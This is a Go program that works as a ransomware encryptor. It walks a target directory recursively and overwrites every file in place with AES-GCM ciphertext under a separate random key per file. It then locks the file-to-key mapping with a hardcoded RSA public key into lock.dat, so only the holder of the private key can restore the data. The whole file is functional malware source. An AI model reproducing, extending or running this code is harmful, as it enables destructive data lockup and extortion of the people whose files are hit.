package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"

	"golang.org/x/crypto/ssh"
)

const sshPubKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuaKdhK+oaLF2UtyMlVmFCqC4fqPYPTGd+ewTJSYBXU8ZRXFH9TTD4JGl7HFMbLSgG2ER5VvsnfQu1WD0fQT2ndzLl47yJkrQmHwuI3UJjcafr0Ej7vhnVHhTux61DL+DZZ45cmtaxE2bnGERCjq3PtIZGV8fPxV+zD0l1eKD3abHwdA1VxUBX3AbdJWlKD01hUuWIxohC2RYxZFfjlLdQM64XylIuSOFcLNmJZINVI5oSh2fQxP2YxS/PQW+SC9Y+yQA+/zHOlFToxYz3uW3RPxul8BDOJPKeLyNKQO+mLNFgkZrdkJXL+9kvTZdqdC4E7BFKg2721aECy53SuAZz Artur@gora`

func main() {
	targetDir := parseTargetDirectory()
	fmt.Printf("[*] Target directory: %s\n", targetDir)

	// 1. Collect all files recursively
	files, err := collectFiles(targetDir)
	if err != nil {
		panic(err)
	}

	// 2. Encrypt each file with its own unique AES key
	fileKeys, err := encryptFilesInDirectory(files)
	if err != nil {
		panic(err)
	}

	// 3. Encrypt the mapping of [file -> key] using hybrid RSA encryption and save to lock.dat
	if err := saveEncryptedMetadata(targetDir, fileKeys); err != nil {
		panic(err)
	}

	fmt.Println("[+] Encryption complete. lock.dat created.")
}

func parseTargetDirectory() string {
	if len(os.Args) > 1 {
		return os.Args[1]
	}
	return "."
}

func collectFiles(root string) ([]string, error) {
	var paths []string
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() && filepath.Base(path) != "lock.dat" {
			paths = append(paths, path)
		}
		return nil
	})
	return paths, err
}

func encryptFilesInDirectory(files []string) (map[string]string, error) {
	fileKeys := make(map[string]string)

	for _, file := range files {
		keyHex, err := encryptSingleFile(file)
		if err != nil {
			return nil, fmt.Errorf("failed to encrypt %s: %w", file, err)
		}
		fileKeys[file] = keyHex
		fmt.Printf("[Encrypted] %s\n", file)
	}

	return fileKeys, nil
}

func encryptSingleFile(filePath string) (string, error) {
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	aesKey := generateRandomKey(32)
	ciphertext := encryptBytes(plaintext, aesKey)

	if err := os.WriteFile(filePath, ciphertext, 0644); err != nil {
		return "", err
	}

	return hex.EncodeToString(aesKey), nil
}

func saveEncryptedMetadata(targetDir string, fileKeys map[string]string) error {
	plainData, err := json.Marshal(fileKeys)
	if err != nil {
		return err
	}

	sessionKey := generateRandomKey(32)
	ciphertext := encryptBytes(plainData, sessionKey)

	pubKey := parsePublicKey(sshPubKey)
	encSessionKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, sessionKey, nil)
	if err != nil {
		return err
	}

	lockFilePath := filepath.Join(targetDir, "lock.dat")
	payload := append(encSessionKey, ciphertext...)
	return os.WriteFile(lockFilePath, payload, 0644)
}

func generateRandomKey(size int) []byte {
	key := make([]byte, size)
	if _, err := rand.Read(key); err != nil {
		panic(err)
	}
	return key
}

func encryptBytes(plaintext, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}
	nonce := generateRandomKey(gcm.NonceSize())
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

func parsePublicKey(pemStr string) *rsa.PublicKey {
	parsedPub, _, _, _, err := ssh.ParseAuthorizedKey([]byte(pemStr))
	if err != nil {
		panic(err)
	}
	return parsedPub.(ssh.CryptoPublicKey).CryptoPublicKey().(*rsa.PublicKey)
}
